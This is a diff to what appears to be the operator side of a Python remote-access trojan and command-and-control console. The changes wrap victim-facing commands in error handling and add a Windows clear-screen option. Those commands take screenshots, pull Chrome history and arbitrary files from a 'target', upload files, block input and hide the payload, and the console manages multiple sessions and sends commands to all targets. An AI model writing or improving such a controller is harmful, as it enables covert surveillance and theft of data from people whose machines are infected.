@@ -140,6 +140,7 @@ banner                ->  Show banner
 hide                  ->  Hide payload
 blockinput            ->  Input will be blocked
 quit                  ->  Quit the existing shell
+=================================================================
             ''', 'yellow'))
         elif command == 'clear':
             os.system('clear')
@@ -150,19 +151,31 @@ quit                  ->  Quit the existing shell
         elif command == 'blockinput':
             print("Input blocked ,will be unblocked in 30 seconds . . .")
         elif command == 'screenshot':
-            download_file(target,'scrn.png')
+            try:
+                download_file(target,'scrn.png')
+            except:
+                print(termcolor.colored("[-] Error occured!","red"))
         elif command == 'history':
             try:
                 download_file(target,'chrome_history.csv')
             except:
                 print("Chrome is not installed")
         elif command[:8] == 'download':
-            download_file(target,command[9:])
+            try:
+                download_file(target,command[9:])
+            except:
+                print(termcolor.colored("[-] Error occured!","red"))
         elif command[:6] == 'upload':
-            upload_file(target,command[7:])
+            try:
+                upload_file(target,command[7:])
+            except:
+                print(termcolor.colored("[-] Error occured!","red"))
         else:
-            result = output_recv(target)
-            print(result)
+            try:
+                result = output_recv(target)
+                print(result)
+            except:
+                print(termcolor.colored("[-] Error occured!","red"))
 
 def accept_connections():
     while True:
@@ -195,6 +208,8 @@ while True:
             print("Session " + str(counter) + '----' + str(ip))
             counter +=1
     elif command == 'clear':
+        os.system('clear')
+    elif command == 'cls':
         os.system('cls')
     elif command == 'help':
         print(termcolor.colored("""
@@ -205,6 +220,7 @@ session             -->  Show active sessions
 sendall             -->  Send command to all targets
 kill                -->  kill a session
 exit                -->  Exit the commandandcontrol      
+cls                 -->  clear terminal [WINDOWS]
 ===============================================================
         """,'yellow'))
     elif command[:7] == 'session':
